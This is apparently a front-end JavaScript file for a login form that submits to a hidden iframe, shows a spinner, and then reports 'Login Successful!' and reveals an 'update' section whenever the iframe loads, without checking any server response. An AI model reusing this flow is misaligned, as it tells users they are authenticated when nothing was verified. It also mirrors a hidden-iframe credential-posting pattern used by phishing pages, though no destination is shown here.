document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('loginForm');
    const loginButton = document.getElementById('loginButton');
    const responseMessage = document.getElementById('responseMessage');
    const hiddenIframe = document.getElementById('hidden_iframe');
    const loginSection = document.getElementById('loginSection');
    const updateSection = document.getElementById('updateSection');

    let formSubmitTimeout;

    loginForm.addEventListener('submit', () => {
        loginButton.disabled = true;
        loginButton.innerHTML = `<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Verifying...`;
        responseMessage.className = '';
        responseMessage.textContent = '';

        formSubmitTimeout = setTimeout(() => {
            responseMessage.className = 'alert alert-danger mt-3';
            responseMessage.textContent = 'Login failed. Please check your credentials and try again.';
            loginButton.disabled = false;
            loginButton.innerHTML = 'Login';
        }, 15000);
    });

    hiddenIframe.addEventListener('load', () => {
        clearTimeout(formSubmitTimeout);

        responseMessage.className = 'alert alert-success mt-3';
        responseMessage.textContent = 'Login Successful! Loading dashboard...';

        setTimeout(() => {
            loginSection.classList.add('d-none');
            updateSection.classList.remove('d-none');
        }, 1000);
    });
});
